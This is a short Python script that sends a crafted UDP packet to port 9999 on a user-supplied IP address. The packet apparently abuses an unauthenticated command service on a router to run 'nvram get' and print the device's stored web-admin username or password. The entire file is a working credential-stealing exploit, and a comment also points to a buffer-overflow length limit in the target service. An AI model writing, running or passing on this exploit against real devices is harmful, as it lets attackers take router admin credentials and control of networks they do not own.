import sys, os, socket, struct
PORT=9999

ip=input("Enter the IP Address to check\n")
localhost='0.0.0.0'
unameOrPwd =input("Enter 1 for Username and 2 for Password\n")

def sendMyPacket(cmd):

    enccmd=cmd.encode()
    print(enccmd)

    if len(enccmd) > 237:
        # Strings longer than 237 bytes cause the buffer to overflow and possibly crash the server. 
        print('Values over 237 will give rise to undefined behaviour.', file=sys.stderr)
        sys.exit(1)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((localhost, PORT))
    sock.settimeout(2)


    packet = (b'\x0C\x15\x33\x00' + os.urandom(4) + (b'\x00' * 38) + struct.pack('<H', len(enccmd)) + enccmd).ljust(512, b'\x00')

    sock.sendto(packet, (ip, PORT))

    while True:
       data, addr = sock.recvfrom(512)
       if len(data) == 512 and data[1] == 22:
           break
    #print(data)
    length = struct.unpack('<H', data[14:16])[0]
    s = slice(16, 16+length)

    length = struct.unpack('<H', data[14:16])[0]
    sys.stdout.buffer.write(data[s])
 
    sock.close()


if unameOrPwd == "1":
    sendMyPacket('nvram get http_username')
else:
    sendMyPacket('nvram get http_passwd')

